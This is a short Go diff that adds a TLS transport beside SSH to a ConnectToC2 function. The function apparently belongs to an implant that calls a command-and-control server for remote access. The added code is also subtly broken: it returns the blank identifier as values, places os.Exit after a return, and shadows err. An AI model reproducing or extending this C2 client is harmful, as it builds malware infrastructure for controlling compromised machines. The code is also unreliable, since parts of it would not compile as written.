@@ -10,6 +10,7 @@ package main
 
 import (
 	"crypto/subtle"
+	"crypto/tls"
 	"fmt"
 	"net"
 	"os"
@@ -42,12 +43,34 @@ func ConnectToC2() (ssh.Conn, <-chan ssh.NewChannel, <-chan *ssh.Request, error)
 	case "ssh":
 		c, err = net.Dial("tcp", ServerAddr)
 		if nil != err {
-			Debugf("Error connecting to %s: %s", ServerAddr, err)
-			os.Exit(4)
+			break
 		}
 		addr = c.RemoteAddr().String()
 		Debugf(
 			"Made TCP connection to server %s->%s",
+			c.LocalAddr(),
+			c.RemoteAddr(),
+		)
+	case "tls":
+		/* Work out the hostname. */
+		h, _, err := net.SplitHostPort(ServerAddr)
+		if nil != err {
+			return _, _, _, fmt.Errorf(
+				"Error extracting hostname from %q: %s",
+				ServerAddr,
+				err,
+			)
+			os.Exit(1)
+		}
+		c, err = tls.Dial("tcp", ServerAddr, &tls.Config{
+			ServerName: h,
+		})
+		if nil != err {
+			break
+		}
+		addr = c.RemoteAddr().String()
+		Debugf(
+			"Made TLS connection to server %s->%s",
 			c.LocalAddr(),
 			c.RemoteAddr(),
 		)
